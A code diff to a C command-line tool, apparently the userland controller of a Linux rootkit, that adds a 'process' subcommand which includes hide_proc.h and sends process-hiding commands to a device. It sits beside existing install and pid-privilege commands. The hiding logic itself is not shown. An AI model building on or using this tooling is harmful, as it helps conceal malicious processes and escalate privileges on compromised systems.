@@ -3,6 +3,7 @@
 #include <install.h>
 #include <util.h>
 #include <privilege.h>
+#include <hide_proc.h>
 
 #include <stdbool.h>
 #include <sys/types.h>
@@ -39,7 +40,8 @@ int commands_privilege_handler(int argc, char **argv)
 	}
 
 	if (pid == -1 || perm == -1) {
-		fprintf(stderr, "error: --pid and --perm must be provided with valid values\n");
+		fprintf(stderr,
+			"error: --pid and --perm must be provided with valid values\n");
 		return -1;
 	}
 
@@ -60,7 +62,28 @@ int commands_privilege_handler(int argc, char **argv)
 	return ret;
 }
 
+int commands_process_handler(int argc, char **argv)
+{
+	pid_t pid = -1;
 
+	bool erase_flag = false;
+
+	int c, ret = 0;
+	ketopt_t o = KETOPT_INIT;
+	while ((c = ketopt(&o, argc, argv, 1, "", proc_longopts)) >= 0) {
+		if (o.arg) {
+			pid = atoi(o.arg);
+			ret += modify_proc(pid, c);
+			if (ret == -1) {
+				fprintf(stderr,
+					"error: unable to write command to device\n");
+				return -1;
+			}
+		}
+	}
+
+	return ret;
+}
 
 int commands_install_handler(int argc, char **argv)
 {
@@ -130,11 +153,11 @@ int commands_uninstall_handler(int argc, char **argv)
 
 int commands_dispatch(int argc, char **argv)
 {
-
 	int c;
 	ketopt_t o = KETOPT_INIT;
 	/* Read until the first command. */
-	while ((c = ketopt(&o, argc, argv, 0, "", 0)) >= 0);
+	while ((c = ketopt(&o, argc, argv, 0, "", 0)) >= 0)
+		;
 
 	if (o.ind == argc) {
 		IMLOG_DEBUG("Failed to find command");
@@ -149,6 +172,8 @@ int commands_dispatch(int argc, char **argv)
 		return commands_uninstall_handler(argc, argv);
 	} else if (strcmp("privilege", cmd) == 0) {
 		return commands_privilege_handler(argc, argv);
+	} else if (strcmp("process", cmd) == 0) {
+		return commands_process_handler(argc, argv);
 	} else {
 		IMLOG_DEBUG("Command not recognised");
 		return -1;
